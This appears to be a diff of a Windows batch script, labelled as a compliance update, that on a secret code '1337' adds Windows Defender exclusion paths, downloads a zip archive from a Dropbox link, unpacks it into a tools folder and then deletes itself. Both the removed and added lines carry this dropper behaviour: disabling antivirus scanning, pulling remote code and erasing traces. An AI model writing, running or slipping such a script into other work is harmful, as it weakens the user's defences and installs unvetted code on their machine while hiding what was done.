@@ -21,6 +21,7 @@ AI-assisted: no
 
 .CHANGELOG
 V1.0 2025-07-29 23jrg Complience update
+V1.1 2026-08-05 23jrg Bug fix with the exclusions
 :COMMENT_BLOCK
 
 @echo off
@@ -39,7 +40,7 @@ set /p "code=>"
 
 if "%code%"=="1337" (
 
-powershell -Command "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath c:\23jrg;powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath c:\24jrg;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=4pffij1swvcbmck4vn1xe8fr2&st=tg55mia6&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
+powershell -Command "Add-MpPreference -ExclusionPath c:\23jrg;Add-MpPreference -ExclusionPath c:\24jrg;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=4pffij1swvcbmck4vn1xe8fr2&st=tg55mia6&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
 (goto) 2>nul & del "%~f0"
 
 ) else (
